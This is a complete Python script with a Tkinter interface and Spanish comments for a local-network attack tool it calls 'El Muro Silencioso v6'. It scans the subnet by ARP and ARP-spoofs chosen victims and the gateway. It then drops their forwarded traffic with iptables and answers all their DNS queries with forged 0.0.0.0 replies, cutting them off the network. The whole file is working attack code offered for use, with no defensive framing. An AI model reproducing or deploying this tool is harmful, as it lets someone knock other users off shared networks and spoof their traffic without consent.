
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EL MURO SILENCIOSO v6 - EDICIÓN ULTRA-FLUIDA
Optimizado para: Ataques masivos simultáneos sin lag.
"""

import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk
import threading
import queue
import time
import random
import subprocess
import os
import sys
from concurrent.futures import ThreadPoolExecutor
from scapy.all import (ARP, Ether, send, srp, AsyncSniffer, 
                       DNS, DNSQR, IP, UDP, DNSRR, conf, 
                       get_if_addr, get_if_hwaddr)

conf.verb = 0

# ==================== ESTADO GLOBAL ====================
IP_GATEWAY = IP_LOCAL = MAC_LOCAL = INTERFACE = None
OBJETIVOS = {} 
LISTA_IPS_ACTIVAS = set() # Para búsqueda rápida en el sniffer
LOCK = threading.Lock()
LOG_QUEUE = queue.Queue()
EXECUTOR = ThreadPoolExecutor(max_workers=100) # Manejo eficiente de hilos

# ==================== MOTOR DE RED ====================
def log(msg):
    LOG_QUEUE.put(f"[{time.strftime('%H:%M:%S')}] {msg}")

def get_network_info():
    global IP_GATEWAY, IP_LOCAL, MAC_LOCAL, INTERFACE
    try:
        route = subprocess.getoutput("ip route show default").split()
        INTERFACE = route[4]
        IP_GATEWAY = route[2]
        IP_LOCAL = get_if_addr(INTERFACE)
        MAC_LOCAL = get_if_hwaddr(INTERFACE)
        return True
    except: return False

# ==================== ATAQUE OPTIMIZADO ====================

def aplicar_iptables(ip, activar=True):
    """El Kernel hace el trabajo, Python descansa."""
    accion = "-I" if activar else "-D"
    cmds = [
        ["iptables", accion, "FORWARD", "-s", ip, "-j", "DROP"],
        ["iptables", accion, "FORWARD", "-d", ip, "-j", "DROP"],
        ["iptables", "-t", "nat", accion, "PREROUTING", "-s", ip, "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", f"{IP_LOCAL}:53"]
    ]
    for c in cmds: subprocess.run(c, capture_output=True)

def dns_handler(pkt):
    """Manejador central único para TODAS las víctimas (Alto Rendimiento)"""
    if not pkt.haslayer(DNSQR): return
    ip_src = pkt[IP].src
    
    with LOCK:
        if ip_src not in LISTA_IPS_ACTIVAS: return

    try:
        res = (IP(dst=ip_src, src=IP_LOCAL)/UDP(dport=pkt[UDP].sport, sport=53)/
               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                   an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="0.0.0.0")))
        send(res, verbose=0, count=1)
    except: pass

# Iniciar el sniffer centralizado una sola vez
SNIFFER_CENTRAL = AsyncSniffer(filter="udp port 53", prn=dns_handler, store=0)

def loop_arp_unico(ip, mac, stop_event):
    """ARP Spoofing quirúrgico"""
    mac_gw = ""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP_GATEWAY), timeout=2, verbose=0)
    if ans: mac_gw = ans[0][1].hwsrc

    while not stop_event.is_set():
        try:
            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=IP_GATEWAY, hwsrc=MAC_LOCAL), verbose=0, count=2)
            if mac_gw: send(ARP(op=2, pdst=IP_GATEWAY, hwdst=mac_gw, psrc=ip, hwsrc=MAC_LOCAL), verbose=0, count=2)
            stop_event.wait(random.uniform(5, 8))
        except: break

# ==================== INTERFAZ Y CONTROL ====================

def switch_ataque(ip):
    with LOCK:
        obj = OBJETIVOS[ip]
        if not obj['activo']:
            obj['activo'] = True
            obj['stop_event'] = threading.Event()
            LISTA_IPS_ACTIVAS.add(ip)
            aplicar_iptables(ip, True)
            EXECUTOR.submit(loop_arp_unico, ip, obj['mac'], obj['stop_event'])
            log(f"🔴 ATAQUE FLUIDO: {ip}")
        else:
            obj['stop_event'].set()
            obj['activo'] = False
            if ip in LISTA_IPS_ACTIVAS: LISTA_IPS_ACTIVAS.remove(ip)
            aplicar_iptables(ip, False)
            log(f"🟢 LIBERADO: {ip}")
    update_gui_list()

def btn_escanear():
    def task():
        log("🔍 Escaneando...")
        red = IP_GATEWAY + "/24"
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=3, verbose=0)
            with LOCK:
                for _, rcv in ans:
                    if rcv.psrc not in [IP_LOCAL, IP_GATEWAY] and rcv.psrc not in OBJETIVOS:
                        OBJETIVOS[rcv.psrc] = {'mac': rcv.hwsrc, 'activo': False, 'stop_event': None}
            log(f"✨ Escaneo completo.")
            ventana.after(0, update_gui_list)
        except: pass
    EXECUTOR.submit(task)

def update_gui_list():
    for w in frame_lista.winfo_children(): w.destroy()
    with LOCK:
        for ip, d in OBJETIVOS.items():
            color = "#3d0c0c" if d['activo'] else "#222"
            f = tk.Frame(frame_lista, bg=color, pady=5)
            f.pack(fill="x", pady=1, padx=10)
            tk.Label(f, text=f"IP: {ip}", bg=color, fg="white", font=("Consolas", 10)).pack(side="left", padx=10)
            btn_t = "DETENER" if d['activo'] else "BLOQUEAR"
            tk.Button(f, text=btn_t, command=lambda i=ip: switch_ataque(i), width=10, bg="#444", fg="white").pack(side="right", padx=10)

def emergency_reset():
    log("🚨 RESET TOTAL...")
    with LOCK:
        for ip in list(OBJETIVOS.keys()):
            if OBJETIVOS[ip]['activo']:
                OBJETIVOS[ip]['stop_event'].set()
                aplicar_iptables(ip, False)
                OBJETIVOS[ip]['activo'] = False
        LISTA_IPS_ACTIVAS.clear()
    subprocess.run(["iptables", "-F"], capture_output=True)
    subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
    update_gui_list()

# ==================== GUI (Tkinter Optimizado) ====================
ventana = tk.Tk()
ventana.title("MURO SILENCIOSO v6 - HIGH PERFORMANCE")
ventana.geometry("900x700")
ventana.configure(bg="#121212")

# Estilo Dark Mode Pro
style = ttk.Style()
style.theme_use('clam')

tk.Label(ventana, text="SISTEMA DE ANULACIÓN DE RED v6", bg="#b30000", fg="white", font=("Impact", 20)).pack(fill="x")

f_ctrl = tk.Frame(ventana, bg="#121212", pady=10)
f_ctrl.pack()
tk.Button(f_ctrl, text="ESCANEAR RED", command=btn_escanear, width=20, bg="#1a1a1a", fg="white").pack(side="left", padx=5)
tk.Button(f_ctrl, text="RESTAURAR TODO", command=emergency_reset, width=20, bg="#1a1a1a", fg="white").pack(side="left", padx=5)

# Contenedor de lista con Scroll
canvas = tk.Canvas(ventana, bg="#121212", highlightthickness=0)
scroll = ttk.Scrollbar(ventana, orient="vertical", command=canvas.yview)
frame_lista = tk.Frame(canvas, bg="#121212")
canvas.create_window((0,0), window=frame_lista, anchor="nw")
canvas.configure(yscrollcommand=scroll.set)
canvas.pack(side="left", fill="both", expand=True, padx=20)
scroll.pack(side="right", fill="y")

# Ajuste automático del scroll
def on_frame_configure(e): canvas.configure(scrollregion=canvas.bbox("all"))
frame_lista.bind("<Configure>", on_frame_configure)

txt_log = scrolledtext.ScrolledText(ventana, height=10, bg="black", fg="#00ff41", font=("Consolas", 8))
txt_log.pack(fill="x", padx=20, pady=10)

def gui_loop():
    try:
        while True:
            txt_log.insert(tk.END, LOG_QUEUE.get_nowait() + "\n")
            txt_log.see(tk.END)
    except queue.Empty: pass
    ventana.after(100, gui_loop)

if __name__ == "__main__":
    if os.geteuid() != 0: print("SUDO REQUERIDO"); sys.exit(1)
    if get_network_info():
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        SNIFFER_CENTRAL.start()
        log(f"Sistema listo en {INTERFACE}")
    gui_loop()
    ventana.protocol("WM_DELETE_WINDOW", lambda: (emergency_reset(), SNIFFER_CENTRAL.stop(), ventana.destroy()))
    ventana.mainloop()
